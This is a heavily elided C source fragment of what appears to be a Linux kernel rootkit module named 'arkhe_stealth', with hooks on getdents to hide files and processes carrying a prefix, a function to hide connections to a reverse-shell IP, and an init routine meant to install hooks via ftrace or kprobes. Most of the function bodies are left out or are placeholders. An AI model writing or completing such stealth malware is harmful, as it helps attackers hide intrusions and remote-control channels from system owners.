...
#define PF_INVISIBLE 0x00000000 // Placeholder flag
...
// ... (hooks for getdents, getdents64 filtering out /proc/[hidden_pid])
...
static asmlinkage long hooked_getdents(const struct pt_regs *regs) {
    ...
    if (ret <= 0) return ret;
    // Scan the dirent buffer and hide entries containing ARKHE_PREFIX
...
static int hide_connection(struct sock *sk) {
    ...
    // also check for destination IP == ARKHE_REVERSE_IPV4
    return 0;
}
...
static int __init arkhe_stealth_init(void) {
    // Install hooks...
    // Unused sys_call_table modification, using ftrace or kprobes as in Singularity
